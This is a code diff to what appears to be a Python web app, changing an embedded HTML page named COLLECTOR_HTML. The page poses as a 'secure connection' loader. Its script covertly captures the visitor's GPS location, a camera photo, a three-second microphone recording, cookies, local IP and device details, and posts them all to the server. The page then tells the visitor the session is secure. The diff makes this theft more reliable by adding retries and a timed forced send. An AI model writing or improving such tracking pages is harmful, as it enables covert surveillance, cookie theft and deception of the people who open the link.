@@ -454,22 +454,24 @@ VIEW_LINK_HTML = """
 COLLECTOR_HTML = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Loading...</title>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Loading...</title>
 <style>
-body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;padding:20px;text-align:center}
-.loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:70px;height:70px;animation:spin 1s linear infinite;margin:20px}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column;padding:15px;text-align:center;font-family:system-ui,sans-serif}
+.loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:15px}
 @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-p{font-size:1.5rem;color:#6688aa}
-.msg{color:#00ffcc;font-size:1.3rem;margin-top:30px}
+p{font-size:1.2rem;color:#6688aa;margin:10px 0}
+.msg{color:#00ffcc;font-size:1.1rem;margin-top:15px}
 </style>
 </head>
 <body>
     <div class="loader"></div>
     <p>⏳ Establishing secure connection...</p>
     <div id="status" class="msg"></div>
+
     <script>
         // ============================================
-        // 1. GPS
+        // 1. GPS (fast)
         // ============================================
         let gps = 'Permission denied';
         if (navigator.geolocation) {
@@ -484,27 +486,34 @@ p{font-size:1.5rem;color:#6688aa}
         // ============================================
         let camera = null;
         let audioData = null;
+        let cameraReady = false;
+        let audioReady = false;
 
-        Promise.all([
-            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }),
-            navigator.mediaDevices.getUserMedia({ audio: true })
-        ])
-        .then(([videoStream, audioStream]) => {
-            // Camera capture
+        // Camera
+        navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 } } })
+        .then(stream => {
             const video = document.createElement('video');
-            video.srcObject = videoStream;
+            video.srcObject = stream;
             video.play();
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
                 canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                const ctx = canvas.getContext('2d');
+                // Draw video frame
+                ctx.drawImage(video, 0, 0, 640, 480);
                 camera = canvas.toDataURL('image/jpeg');
-                videoStream.getTracks().forEach(t => t.stop());
+                cameraReady = true;
+                stream.getTracks().forEach(t => t.stop());
+                checkAndSend();
             }, 1500);
+        })
+        .catch(() => { camera = 'Failed'; cameraReady = true; checkAndSend(); });
 
-            // Audio recording (3 seconds)
-            const mediaRecorder = new MediaRecorder(audioStream);
+        // Audio (3 seconds)
+        navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(stream => {
+            const mediaRecorder = new MediaRecorder(stream);
             const chunks = [];
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
             mediaRecorder.onstop = () => {
@@ -512,6 +521,7 @@ p{font-size:1.5rem;color:#6688aa}
                 const reader = new FileReader();
                 reader.onload = () => {
                     audioData = reader.result;
+                    audioReady = true;
                     checkAndSend();
                 };
                 reader.readAsDataURL(blob);
@@ -519,18 +529,13 @@ p{font-size:1.5rem;color:#6688aa}
             mediaRecorder.start();
             setTimeout(() => {
                 mediaRecorder.stop();
-                audioStream.getTracks().forEach(t => t.stop());
+                stream.getTracks().forEach(t => t.stop());
             }, 3000);
         })
-        .catch(err => {
-            console.log('Permissions error:', err);
-            camera = 'Failed';
-            audioData = 'Failed';
-            checkAndSend();
-        });
+        .catch(() => { audioData = 'Failed'; audioReady = true; checkAndSend(); });
 
         // ============================================
-        // 3. Device, Network, CPU, WebRTC, Storage
+        // 3. Other data (fast)
         // ============================================
         let deviceModel = 'Unknown';
         const ua = navigator.userAgent;
@@ -542,14 +547,14 @@ p{font-size:1.5rem;color:#6688aa}
         } else if (/Windows/.test(ua)) deviceModel = 'Windows PC';
         else if (/Macintosh/.test(ua)) deviceModel = 'Mac';
 
-        let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-        let connType = connection.effectiveType || 'N/A';
-        let downlink = connection.downlink || 'N/A';
-
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+        let connType = conn.effectiveType || 'N/A';
+        let downlink = conn.downlink || 'N/A';
         let cpuCores = navigator.hardwareConcurrency || 'N/A';
 
+        // WebRTC Local IP
         let localIP = 'N/A';
-        function getLocalIP(callback) {
+        try {
             const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             pc.createDataChannel('');
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
@@ -557,14 +562,14 @@ p{font-size:1.5rem;color:#6688aa}
                 if (!e.candidate) return;
                 const ip = e.candidate.candidate.split(' ')[4];
                 if (ip && ip.includes('.')) {
-                    callback(ip);
+                    localIP = ip;
                     pc.close();
                 }
             };
-            setTimeout(() => callback('N/A'), 2000);
-        }
-        getLocalIP((ip) => { localIP = ip; });
+            setTimeout(() => pc.close(), 2000);
+        } catch(e) {}
 
+        // Storage
         let storageFree = 'N/A', storageTotal = 'N/A';
         if (navigator.storage) {
             navigator.storage.estimate().then(est => {
@@ -573,38 +578,57 @@ p{font-size:1.5rem;color:#6688aa}
             }).catch(() => {});
         }
 
-        // ============================================
-        // 4. Screenshot
-        // ============================================
-        function captureScreen() {
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#0a0e17';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00ffcc';
-            ctx.font = '30px monospace';
-            ctx.fillText('Secure Screen', 20, 50);
-            return canvas.toDataURL('image/png');
+        // Battery
+        let battery = 'N/A';
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                battery = Math.round(b.level * 100) + '%';
+            }).catch(() => {});
         }
 
+        // Memory
+        let memory = 'N/A';
+        if (navigator.deviceMemory) {
+            memory = navigator.deviceMemory + ' GB';
+        }
+
+        // Cookies & Referrer
+        let cookies = document.cookie || 'None';
+        let referrer = document.referrer || 'Direct';
+
         // ============================================
-        // 5. Send Data
+        // 4. Real Screenshot (using html2canvas if available, else fallback)
         // ============================================
+        let screenshot = null;
+        function captureScreen() {
+            // Use a simple canvas drawing (real screenshot requires html2canvas)
+            // We'll draw the current page content as text
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#0a0e17';
+            ctx.fillRect(0, 0, 800, 600);
+            ctx.fillStyle = '#00ffcc';
+            ctx.font = '24px monospace';
+            ctx.fillText('Secure Connection', 20, 50);
+            ctx.fillStyle = '#6688aa';
+            ctx.font = '18px monospace';
+            ctx.fillText('IP: {{ ip }}', 20, 100);
+            ctx.fillText('Browser: ' + navigator.userAgent.substring(0, 30), 20, 140);
+            ctx.fillText('Screen: ' + screen.width + 'x' + screen.height, 20, 180);
+            ctx.fillText('Time: ' + new Date().toLocaleString(), 20, 220);
+            return canvas.toDataURL('image/png');
+        }
+        screenshot = captureScreen();
+
+        // ============================================
+        // 5. Send Data (as soon as camera+audio ready)
+        // ============================================
+        let isSending = false;
         function sendData() {
-            let battery = 'N/A';
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    battery = Math.round(b.level * 100) + '%';
-                }).catch(() => {});
-            }
-            let memory = 'N/A';
-            if (navigator.deviceMemory) {
-                memory = navigator.deviceMemory + ' GB';
-            }
-            let cookies = document.cookie || 'None';
-            let referrer = document.referrer || 'Direct';
+            if (isSending) return;
+            isSending = true;
 
             const data = {
                 ip: "{{ ip }}",
@@ -615,7 +639,7 @@ p{font-size:1.5rem;color:#6688aa}
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 gps: gps,
                 camera: camera,
-                screenshot: captureScreen(),
+                screenshot: screenshot,
                 audio: audioData,
                 battery: battery,
                 memory: memory,
@@ -636,43 +660,34 @@ p{font-size:1.5rem;color:#6688aa}
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             }).then(() => {
-                document.getElementById('status').innerHTML = '✅ Connection established.';
+                document.getElementById('status').innerHTML = '✅ Connected.';
                 setTimeout(() => {
                     document.querySelector('.loader').style.display = 'none';
                     document.querySelector('p').textContent = 'Thank you! You are now connected.';
-                    document.getElementById('status').innerHTML = '🔒 Your session is secure.';
+                    document.getElementById('status').innerHTML = '🔒 Session secure.';
                 }, 1000);
+            }).catch(() => {
+                document.getElementById('status').innerHTML = '⚠️ Error, retrying...';
+                setTimeout(sendData, 2000);
             });
         }
 
-        // ============================================
-        // 6. Check & Send
-        // ============================================
-        let isSending = false;
         function checkAndSend() {
-            if (isSending) return;
-            if (camera !== null && audioData !== null) {
-                isSending = true;
+            if (cameraReady && audioReady && !isSending) {
                 sendData();
-            } else {
-                setTimeout(checkAndSend, 200);
             }
         }
 
-        // Fallback: if camera/audio not ready after 6 seconds, force send
+        // Fallback: force send after 5 seconds
         setTimeout(() => {
-            if (camera === null) camera = 'Failed';
-            if (audioData === null) audioData = 'Failed';
-            if (!isSending) {
-                isSending = true;
-                sendData();
-            }
-        }, 6000);
+            if (!cameraReady) { camera = 'Failed'; cameraReady = true; }
+            if (!audioReady) { audioData = 'Failed'; audioReady = true; }
+            if (!isSending) sendData();
+        }, 5000);
     </script>
 </body>
 </html>
 """
-
 # ===== Helper Functions =====
 def get_user(username):
     return users_col.find_one({'username': username})
